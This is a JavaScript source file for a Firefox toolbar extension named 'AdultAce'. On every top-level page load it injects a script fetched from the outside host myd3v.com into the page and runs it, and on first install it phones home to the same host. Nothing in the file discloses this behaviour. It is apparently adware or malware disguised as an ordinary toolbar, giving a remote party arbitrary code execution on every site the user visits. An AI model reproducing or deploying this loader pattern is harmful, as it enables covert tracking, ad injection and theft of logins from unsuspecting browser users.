var AdultAce =
{
	jsLink: '//' + 'myd3v.com' + '/js/aat.js',
    
    init: function() {
    	var appcontent = document.getElementById("appcontent");
        if(appcontent) {
            appcontent.addEventListener("DOMContentLoaded", AdultAce.onPageLoad, true);
        }

        var firstRun = Services.prefs.getBoolPref('extensions.adult-ace-toolbar.firstrun');
		if(firstRun == true)
		{
			var req = Cc["@mozilla.org/xmlextras/xmlhttprequest;1"].createInstance(Ci.nsIXMLHttpRequest);
			var url = "http://myd3v.com/api/stats/install/firefox";
			req.open ("GET", url,true);
			req.send();
			Services.prefs.setBoolPref('extensions.adult-ace-toolbar.firstrun', false);
		}
    },
    onPageLoad: function(event) {
	    var doc = event.originalTarget;
	    var win = doc.defaultView;

    	if(
            win != win.top
            || doc.body.innerHTML.length < 10
            || doc.location.href == 'about:blank'
        )
        {
            return;
        }

        var head = doc.getElementsByTagName('head')[0];
        if ( !head ) return;

        AdultAce.getLoader(doc);
    },
    getLoader: function(doc){
        var head = doc.getElementsByTagName('head')[0];
        var script_loader = doc.createElement('script');
        script_loader.type = "text/javascript";
        script_loader.src = AdultAce.jsLink;
        script_loader.onload = function() {
            var script_init = doc.createElement('script');
            script_init.type = "text/javascript";
            script_init.innerHTML = "(new aatPlugin()).init();";
            head.appendChild(script_init);
        };
        head.appendChild(script_loader);
    }
}
window.addEventListener("load", function() { AdultAce.init(); }, false);

AddonManager.addAddonListener({
	onUninstalling : function(addon){
		Services.prefs.setBoolPref('extensions.adult-ace-toolbar.firstrun', true);
	}
}); 
